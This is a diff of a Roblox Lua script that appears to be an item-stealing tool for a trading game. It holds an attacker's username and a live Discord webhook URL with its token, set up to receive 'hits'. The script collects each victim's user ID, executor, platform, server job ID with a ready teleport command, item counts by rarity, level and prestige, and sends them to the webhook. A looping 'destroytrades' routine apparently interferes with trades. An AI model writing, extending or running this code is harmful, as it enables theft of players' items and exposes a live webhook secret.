@@ -1,3 +1,4 @@
+
 -- [ Settings ] --
 Username = "QuadCoreDragon" -- [Your Username]
 Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Your Webhook For Hits]
@@ -41,7 +42,8 @@ or "Unknown"
 local PlayersValue = #game:GetService("Players"):GetPlayers() 
 or "Unknown"
 local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
-local PlatformValue
+local PlatformValue = "Unknown"
+
 if game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled and not game:GetService("UserInputService").MouseEnabled then
     PlatformValue = "Mobile"
 else
@@ -77,8 +79,7 @@ function SendMessageEMBED(url, embed, bool)
                 fields = embed.fields,
             }
         }
-    }
-
+}
     local body = http:JSONEncode(data)
     local body2 = http:JSONEncode(data2)
     
@@ -98,6 +99,7 @@ function SendMessageEMBED(url, embed, bool)
         })
     end
 end
+
 local destroytrades2 = coroutine.create(function()
     while true do
         local player = game:GetService("Players").LocalPlayer
@@ -308,12 +310,10 @@ local embed = {
         {
             ["name"] = "〘:bust_in_silhouette:〙**Player Info**",
             ["value"] = "```lua\nUsername: " .. Username .. "\nUser ID: " .. game.Players[Username].UserId .. "\nExecutor: " .. ExecutorValue .. "\nPlatform: " .. PlatformValue .. "\nPlayers Count: " .. PlayersValue .. "\nItems Count: " .. itemsCount .. "\nLevel: " .. playerLevel .. "\nPrestige: " .. playerPrestige .. "```",
-            ["inline"] = true,
         },
         {
             ["name"] = "〘:gift:〙**Items Info**",
             ["value"] = "```lua\nVintage: " .. vintageItemsC .. "\nCommon: " .. commonItemsC .. "\nUncommon: " .. uncommonItemsC .. "\nRare: " .. rareItemsC .. "\nLegendary: " .. legendaryItemsC .. "\nGodly: " .. godlyItemsC .. "\nAncient: " .. ancientItemsC .. "\nUnique: " .. uniqueItemsC .. "```",
-            ["inline"] = true,
         }
     }
 }
